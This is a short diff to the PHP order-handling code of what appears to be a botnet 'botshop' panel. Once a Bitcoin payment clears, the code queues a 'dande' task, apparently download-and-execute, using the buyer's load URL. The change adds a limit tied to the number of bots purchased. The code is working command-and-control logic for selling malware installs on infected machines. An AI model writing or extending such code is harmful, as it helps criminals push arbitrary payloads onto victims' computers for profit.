@@ -172,8 +172,8 @@ class OrderApi
         if($order["coinstopay"] <= $payAmount){
             //Update order and insert Task
             if($order["taskid"] == "none"){
-                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command) VALUES (?, ?, ?, ?)");
-                $statement->execute(array('[]', 0, 'dande', $order["loadurl"]));
+                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command, execution_limit) VALUES (?, ?, ?, ?, ?)");
+                $statement->execute(array('[]', 0, 'dande', $order["loadurl"], $order["botamount"]));
                 $taskid = $GLOBALS["pdo"]->lastInsertId();
 
                 $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE address = ?");
@@ -185,7 +185,7 @@ class OrderApi
 
         }else{
             if($payAmount != "0.00000000" || $payAmount != 0){
-                echo json_encode(array("success"=>"false","message"=>"Please send more Bitcoin","current"=>$payAmount,"order"=>$order));
+                echo json_encode(array("success"=>"false","message"=>"Please send more Bitcoin","current"=>$payAmount,"order"=> $order));
             }else{
                 echo json_encode(array("success"=>"false","message" => "Please send Bitcoin to the flowing address", "current"=>"" , "order"=>$order));
             }
